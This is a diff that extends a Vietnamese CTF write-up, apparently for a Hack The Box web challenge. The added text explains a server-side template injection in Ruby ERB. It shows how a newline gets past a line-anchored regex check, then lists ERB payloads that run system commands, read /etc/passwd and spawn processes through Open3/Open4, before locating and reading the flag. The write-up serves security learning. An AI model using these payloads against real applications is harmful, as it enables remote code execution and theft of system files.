@@ -372,8 +372,47 @@ Dạng đặc trưng của SSTI, bài cho ta source code:
 end
                                              
 ```
+
+Bài đang dùng template ERB của ruby, phân tích một chút.
+**params[:neon] =~ /^[0-9a-z ]+$/i**, dòng điều kiện này giống như biểu thức chính quy regex với "=~" được sử dụng để so sánh giá trị của tham số "neon" với biểu thức chính quy từ 0 đến 9 và từ a đến z và không phân biệt hoa thường. Mục tiêu của ta giờ là phải bypass được nó để thực hiện ssti. 
+Ta để ý đoạn regex bắt đầu từ ^ và kết thúc với $, đọc tài liệu ta sẽ có thông tin như sau: 
+
+![image](https://user-images.githubusercontent.com/104350480/233561661-079bbcb6-5483-4e53-81d0-fa33a8a36917.png)
+
+tức là ^ và $ sẽ thực hiện regex bắt đầu và kết thúc cho 1 dòng chứ không phải 1 chuỗi, vậy nếu ta điền 1 dòng hợp lệ và ở dòng thứ 2 ta nhập bất cứ gì thì có thể sẽ thành công, trick quen thuộc sẽ là dùng %0A hoặc là \n. 
+                                          
+![image](https://user-images.githubusercontent.com/104350480/233562145-13c5f3c0-4c0d-4b13-b53e-b1ccc6b6b0af.png)
+
+Oke vậy là ổn, giờ ta sẽ thực hiện cmd ssti của erb, một số lệnh ssti của erb: 
                                              
-    Bài đang dùng template ERB của ruby, phân tích một chút.
-                                              params[:neon] =~ /^[0-9a-z ]+$/i  
+ ```
                                              
+{{7*7}} = {{7*7}}
+${7*7} = ${7*7}
+<%= 7*7 %> = 49
+<%= foobar %> = Error
+<%= system("whoami") %> #Execute code
+<%= Dir.entries('/') %> #List folder
+<%= File.open('/etc/passwd').read %> #Read file
+
+<%= system('cat /etc/passwd') %>
+<%= `ls /` %>
+<%= IO.popen('ls /').readlines()  %>
+<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
+<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>                                         
                                              
+```
+        
+![image](https://user-images.githubusercontent.com/104350480/233562696-036b2e24-ffb5-4539-a0f7-5a64f88fddb4.png)
+
+Giờ tìm vị trí chứa flag nữa là xong: thay bằng lệnh **find / -name "flag*"** để tìm kiếm 
+        
+![image](https://user-images.githubusercontent.com/104350480/233563694-5523ff49-bc16-4214-bd2b-a814ded25ba4.png)
+
+Đọc flag nữa là xong: 
+        
+![image](https://user-images.githubusercontent.com/104350480/233563851-de721d80-7c5d-42dc-952c-071fcbe32dc5.png)
+        
+> Flag: HTB{r3pl4c3m3n7_s3cur1ty}
+    
+    
